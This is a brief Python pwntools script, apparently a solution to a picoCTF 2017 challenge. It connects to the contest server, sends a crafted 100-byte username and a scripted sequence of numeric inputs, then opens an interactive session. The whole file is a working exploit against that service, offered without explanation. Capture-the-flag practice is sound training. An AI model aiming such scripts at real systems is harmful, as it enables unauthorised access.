from pwn import *
HOST, PORT = 'shell2017.picoctf.com',42941
r = remote(HOST, PORT)
r.recv()
username = b'\x03' * 100
r.sendline(username)
r.recv()
for i in range(60):
    r.sendline(b'01')
    log.info(r.recv())

r.sendline(b'40')
log.info(r.recv())
r.sendline(b'80')
log.info(r.recv())
r.sendline(b'160')
log.info(r.recv())
r.sendline(b'200')
log.info(r.recv())
r.interactive()
r.close()
